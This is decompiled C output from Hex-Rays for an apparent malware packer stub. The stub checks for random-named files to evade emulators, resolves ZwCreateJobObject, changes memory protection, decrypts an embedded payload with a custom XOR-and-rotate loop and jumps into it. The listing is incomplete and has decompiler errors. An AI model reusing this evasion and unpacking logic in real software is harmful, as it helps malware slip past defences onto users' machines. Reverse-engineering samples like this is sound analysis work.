/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401023(void); // weak
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
_DWORD *__stdcall sub_40F76B(_DWORD *a1, unsigned int a2, int a3);
int start();

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[8] =
{
  -1626269688,
  -1798653420,
  -76151647,
  -972584000,
  -1223365905,
  1303930965,
  -833239027,
  758341407
}; // weak
_UNKNOWN loc_40F8B2; // weak
WCHAR aFxmf8xlvlw95ls[] = L"\u7846\u466D\u5838\u766C\u576C\u3539\u534C\u486F\u5452\u4377\u2E73\u4532k"; // idb
WCHAR aFibwvf3ecywuoD[] = L"\u4946\u7742\u4676\u6533\u5963\u5557\u2E4F\u30443"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR aIvtfhykgo9eijY[] = "iVTfhyKgO9eIj.YVw"; // idb
CHAR aJb9o6aps18v4H9[] = "jB9O6apS18v4.h9f"; // idb
CHAR aG6jmfdnhpeuanX[] = "g6jmfDNHpEuAn.XRo"; // idb
CHAR aInuogxvkf5tpdi[] = "iNuOGXVkf5tpdiLgE1.5Mn"; // idb
CHAR aTypnqjvdylw7ry[] = "tYpnQJvdyLw7rY.bxU"; // idb
WCHAR aBnwyGpn[] = L"\u4E62\u7977\u672E\u4E50"; // idb
WCHAR aYgxh7gKsb[] = L"\u6779\u4878\u4737\u4B2E\u4273"; // idb
CHAR ProcName[] = "ZwCreateJobObject"; // idb
CHAR FileName[] = "Ehew0Tn1ZM42wH.3BS"; // idb


//----- (00401023) --------------------------------------------------------
#error "401028: cannot convert to microcode (funcsize=5)"

//----- (0040F76B) --------------------------------------------------------
_DWORD *__stdcall sub_40F76B(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // edx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result -= a3;
    *result -= a3;
    *result ^= 0xC7519712;
    *result += 1778558570;
    *result += 79597803;
    *result = __ROL4__(*result, 248);
    ++result;
    --v4;
  }
  while ( v4 );
  return result;
}

//----- (0040F7A3) --------------------------------------------------------
int start()
{
  bool v0; // zf
  void (*v1)(void); // eax
  HANDLE v2; // eax
  const CHAR *v4; // [esp-28h] [ebp-64h]
  DWORD v5; // [esp-24h] [ebp-60h]
  DWORD v6; // [esp-20h] [ebp-5Ch]
  DWORD v7; // [esp-20h] [ebp-5Ch]
  int *v8; // [esp-1Ch] [ebp-58h]
  struct _SECURITY_ATTRIBUTES *v9; // [esp-1Ch] [ebp-58h]
  struct _SECURITY_ATTRIBUTES *v10; // [esp-1Ch] [ebp-58h]
  SIZE_T v11; // [esp-18h] [ebp-54h]
  DWORD v12; // [esp-18h] [ebp-54h]
  DWORD v13; // [esp-18h] [ebp-54h]
  DWORD v14; // [esp-14h] [ebp-50h]
  DWORD v15; // [esp-14h] [ebp-50h]
  DWORD *v16; // [esp-10h] [ebp-4Ch]
  void (*v17)(void); // [esp-10h] [ebp-4Ch]
  int v18; // [esp-Ch] [ebp-48h]
  int v19; // [esp-8h] [ebp-44h]
  HMODULE v20; // [esp-8h] [ebp-44h]
  int v21; // [esp-4h] [ebp-40h]
  NTSTATUS (__stdcall *ZwCreateJobObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES); // [esp+0h] [ebp-3Ch]
  HANDLE v23; // [esp+4h] [ebp-38h]
  HANDLE v24; // [esp+8h] [ebp-34h]
  DWORD flOldProtect[4]; // [esp+Ch] [ebp-30h] BYREF
  char *v26; // [esp+1Ch] [ebp-20h]
  void (*v27)(void); // [esp+20h] [ebp-1Ch]
  HANDLE v28; // [esp+24h] [ebp-18h]
  void (*v29)(void); // [esp+28h] [ebp-14h]
  HANDLE v30; // [esp+2Ch] [ebp-10h]
  void (*v31)(void); // [esp+30h] [ebp-Ch]
  HMODULE hModule; // [esp+34h] [ebp-8h]
  char *v33; // [esp+38h] [ebp-4h]

  v26 = (char *)CreateFileA(FileName, 0x80000000, 7u, 0, 3u, 0x21u, 0);
  v0 = v26 + 1 == 0;
LABEL_2:
  if ( v0 )
  {
    hModule = GetModuleHandleA(ModuleName);
    GetCommandLineA();
    GetCommandLineA();
    GetCommandLineA();
    v20 = hModule;
    GetLastError();
    ZwCreateJobObject = (NTSTATUS (__stdcall *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES))GetProcAddress(v20, ProcName);
    v21 = 0;
    v19 = 0;
    v18 = 0;
    v17 = 0;
    v15 = 288;
    v12 = 3;
    v9 = 0;
    v6 = 6;
LABEL_4:
    flOldProtect[1] = (DWORD)CreateFileA(aInuogxvkf5tpdi, 0x60000000u, v6, v9, v12, v15, v17);
    GetLastError();
    v1 = (void (*)(void))((int (__cdecl *)(int, int, int, NTSTATUS (__stdcall *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES), HANDLE, HANDLE))ZwCreateJobObject)(
                           v18,
                           v19,
                           v21,
                           ZwCreateJobObject,
                           v23,
                           v24);
LABEL_5:
    v31 = v1;
    v29 = v1;
    GetLastError();
    v29 = (void (*)(void))((unsigned int)v29 ^ 0xC0000005);
    GetCommandLineA();
    v29 = (void (*)(void))((char *)&loc_40F8B2 + (_DWORD)v29);
    v2 = CreateFileA(aG6jmfdnhpeuanX, 0x60000000u, 0, 0, 3u, 0x87u, 0);
    goto LABEL_6;
  }
  while ( 1 )
  {
    VirtualProtect(v8, v11, v14, v16);
    v33 = (char *)CreateFileW(aFibwvf3ecywuoD, 0xC0000000, 1u, 0, 3u, 0x1A2u, 0);
    v0 = v33 + 1 == 0;
    if ( v33 != (char *)-1 )
      goto LABEL_2;
    v17 = v31;
    v15 = 58535;
    v24 = CreateFileA(aJb9o6aps18v4H9, 0, 5u, 0, 3u, 0x123u, 0);
    if ( v24 != (HANDLE)-1 )
      goto LABEL_4;
    v13 = (DWORD)dword_401000;
    v23 = CreateFileW(aFxmf8xlvlw95ls, 0x80000000, 2u, 0, 3u, 0x185u, 0);
    if ( v23 == (HANDLE)-1 )
      break;
LABEL_7:
    v1 = (void (*)(void))CreateFileA(v4, v5, v7, v10, v13, v15, v17);
    do
    {
      flOldProtect[2] = (DWORD)v1;
      if ( v1 != (void (*)(void))-1 )
        goto LABEL_5;
      v16 = flOldProtect;
      v1 = (void (*)(void))CreateFileA(aIvtfhykgo9eijY, 0, 7u, 0, 3u, 0x22u, 0);
      v27 = v1;
    }
    while ( v1 != (void (*)(void))-1 );
    v14 = 64;
    GetLastError();
    v11 = 58535;
    v8 = dword_401000;
    GetCommandLineA();
  }
  v29 = v31;
  GetLastError();
  v29 = (void (*)(void))((char *)v29 + 1073741819);
  v28 = CreateFileW(aBnwyGpn, 0x40000000u, 4u, 0, 3u, 0x1A1u, 0);
  v29 = (void (*)(void))((char *)sub_40F76B + (_DWORD)v29);
  v2 = CreateFileW(aYgxh7gKsb, 0xC0000000, 5u, 0, 3u, 0xA1u, 0);
  flOldProtect[3] = (DWORD)v2;
  if ( v2 != (HANDLE)-1 )
  {
LABEL_6:
    v30 = v2;
    GetCommandLineA();
    v29();
    v17 = 0;
    v15 = 386;
    v13 = 3;
    v10 = 0;
    v7 = 1;
    v5 = -1073741824;
    v4 = aTypnqjvdylw7ry;
    goto LABEL_7;
  }
  GetCommandLineA();
  ((void (__cdecl *)(int *, int, void (*)(void)))v29)(dword_401000, 58535, v17);
  return sub_401023();
}
// 40F839: variable 'v6' is possibly undefined
// 40F839: variable 'v9' is possibly undefined
// 40F839: variable 'v12' is possibly undefined
// 40F849: variable 'ZwCreateJobObject' is possibly undefined
// 40F849: variable 'v18' is possibly undefined
// 40F849: variable 'v19' is possibly undefined
// 40F849: variable 'v21' is possibly undefined
// 40F849: variable 'v23' is possibly undefined
// 40F849: variable 'v24' is possibly undefined
// 40F8CF: variable 'v4' is possibly undefined
// 40F8CF: variable 'v5' is possibly undefined
// 40F8CF: variable 'v7' is possibly undefined
// 40F8CF: variable 'v10' is possibly undefined
// 40F936: variable 'v8' is possibly undefined
// 40F936: variable 'v11' is possibly undefined
// 40F936: variable 'v14' is possibly undefined
// 40F936: variable 'v16' is possibly undefined
// 401000: using guessed type int dword_401000[8];
// 401023: using guessed type int sub_401023(void);

// nfuncs=10 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 3 function(s)"
